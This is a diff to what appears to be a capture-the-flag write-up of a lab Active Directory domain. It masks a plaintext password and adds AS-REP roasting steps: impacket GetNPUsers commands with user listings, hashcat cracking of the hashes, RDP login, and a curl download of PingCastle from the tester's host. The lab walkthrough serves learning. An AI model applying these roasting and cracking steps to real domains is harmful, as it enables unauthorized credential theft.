@@ -951,7 +951,7 @@ I tried to login through RDP but it failed, probably the user is a service accou
 
 Through the shell we can collect the user flag located in the desktop. Then I tried to search for common vulnerabilities to try to escalate my privilege but I found nothing, then I tried with kerberosting:
 
-    impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.212.38 'thm.corp/automate:Passw0rd1'
+    impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.212.38 'thm.corp/automate:Pxxxxxxx'
     Impacket v0.12.0.dev1 - Copyright 2023 Fortra
     
     ServicePrincipalName  Name               MemberOf                                                      PasswordLastSet             LastLogon                   Delegation  
@@ -977,7 +977,41 @@ So we collected 8 unique hashes that we can try to reverse and one of those, dar
     ....
     Recovered........: 0/8 (0.00%) Digests (total), 0/8 (0.00%) Digests (new), 0/8 (0.00%) Salts
 
-Pity, nothing was found.
+Pity, no hashes were reversed. At this point, even if is quite rare to date to find such configuration, I checked if there are any AS-REP roasting users. Just to recall this technique allows retrieving password hashes for users that have: <i>Do not require Kerberos preauthentication</i> property selected. Remoting attack execution:
+
+    mpacket-GetNPUsers -dc-ip 10.10.191.151 -ts  'thm.corp/automate:Pxxxxx'
+    ...
+    Name           MemberOf                                                      PasswordLastSet             LastLogon                   UAC      
+    -------------  ------------------------------------------------------------  --------------------------  --------------------------  --------
+    ERNESTO_SILVA  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-07-18 18:21:44.224354  <never>                     0x410200 
+    TABATHA_BRITT  CN=Gu-gerardway-distlist1,OU=AWS,OU=Stage,DC=thm,DC=corp      2023-08-21 22:32:59.571306  2023-08-21 22:32:05.792734  0x410200 
+    LEANN_LONG     CN=CH-ecu-distlist1,OU=Groups,OU=OGC,OU=Stage,DC=thm,DC=corp  2023-07-18 18:21:44.161807  2023-06-16 14:16:11.147334  0x410200 
+
+We got 3 users. Then we can request a TGT for the users to try to reverse it using hashcat:
+
+    impacket-GetNPUsers -dc-ip 10.10.191.151 -ts  'thm.corp/automate:Pxxxxxx'  -request -format hashcat -outputfile as-rep_kbr
+
+Then we can proceed to try to reverse the hashes (note that her I run hashcat on a Kali box):
+
+    sudo hashcat -m 18200 -a 0 as-rep_kbr /usr/share/wordlists/rockyou.txt 
+    ...
+    Session..........: hashcat
+    Status...........: Exhausted
+    ...
+    Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new), 1/3 (33.33%) Salts
+
+We were able to get the password for the user <b>TABATHA_BRITT@THM.CORP:</b>. With this account I tried to RDP into the server. We can signin as a temporary profiles, it means that every saved file will be lost on log-out. 
+
+    C:\Users\TEMP.THM>curl -O http://10.9.1.153:8000/PingCastle_3.2.0.1.zip
+
+    Import-Module ActiveDirectory
+    
+
+
+
+
+    
+
 
 
 
